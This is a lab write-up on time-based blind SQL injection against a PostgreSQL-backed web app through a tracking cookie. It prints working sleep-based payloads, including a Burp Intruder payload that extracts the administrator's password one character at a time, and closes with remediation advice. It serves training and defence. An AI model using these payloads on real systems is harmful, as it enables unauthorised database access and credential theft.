# Lab: Blind SQL Injection with Time Delays

| **Category** | Web Security / SQL Injection |
| :--- | :--- |
| **Vulnerability Type** | Blind SQLi (Time-Based) |
| **Database** | PostgreSQL |
| **Tools Used** | Burp Suite Professional (Repeater & Intruder) |
| **Status** | ✅ Solved |

---

## Conceptual Overview

**Time-Based Blind SQL Injection** is used when an application is completely "mute"—it does not return database errors (Status 500) nor does the page content change (Boolean differentiation) based on user input.

In this scenario, i inject a query that forces the database to **"Sleep" (Pause)** for a specific duration if our condition is TRUE. By measuring the time taken for the server to respond, i can infer information.

* **Rule:** If Response Time $\ge$ 10 seconds $\rightarrow$ Condition is **TRUE**.
* **Rule:** If Response Time is Instant $\rightarrow$ Condition is **FALSE**.

---

## Phase 1: Database Fingerprinting

Since the application suppresses errors, i first had to identify the database type by testing different "sleep" commands.

### The Test Vectors:
* **Oracle:** `dbms_pipe.receive_message(('a'),10)`
* **Microsoft:** `WAITFOR DELAY '0:0:10'`
* **PostgreSQL:** `pg_sleep(10)` $\leftarrow$ **(Confirmed)**

**Injection Point:** `TrackingId` Cookie.

**Successful Payload:**
```sql
'||pg_sleep(10)--
```

## Phase 2: The Exploitation Logic
i use a conditional statement to extract the password character by character.
### The Logic Vector:
``` SQL
SELECT CASE WHEN (YOUR_CONDITION) THEN pg_sleep(10) ELSE pg_sleep(0) END
```
### 1. Verification (True vs False)
To ensure i have control, i tested:
1. True Condition (1=1): ...CASE WHEN (1=1)... Result: 10s Delay.
2. False Condition (1=0): ...CASE WHEN (1=0).. Result: Instant Response.

## Phase 3: Automation (Burp Intruder)
To extract the password, i configured a Cluster Bomb attack.

### 1. The Injection Payload
I injected the following into the cookie.

Note: Spaces are replaced with + to prevent HTTP request errors.

Note: I use string concatenation || instead of stacked queries ; for better stability.

``` SQL
'||(SELECT+CASE+WHEN+(SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username='administrator')--
```
### 2. Critical Configurations
Time-based attacks require specific tuning in Burp Suite:

Payload Encoding:

Uncheck "URL-encode these characters" in the Payloads tab (crucial, otherwise + becomes %2b and fails).

### Resource Pool (Threading):

Create a new pool with Maximum concurrent requests = 1.

Reason: If multiple requests sleep simultaneously, i cannot determine which character caused the delay.

Analysis Columns:

Enabled the "Response received" column in results to sort by time.

### 3. Result Analysis
Any payload causing a response time of ~10,000ms indicated a character match.

## Remediation
1. Parameterized Queries: Use Prepared Statements (e.g., PreparedStatement in Java, Psycopg2 parameterized queries in Python) to separate code from data.

2. Input Validation: Strictly whitelist expected characters for cookies (e.g., alphanumeric only).

3. WAF Configuration: Configure Web Application Firewalls to detect and block SQL keywords like pg_sleep, WAITFOR, and CASE WHEN.

# Documented by: *Riyaz*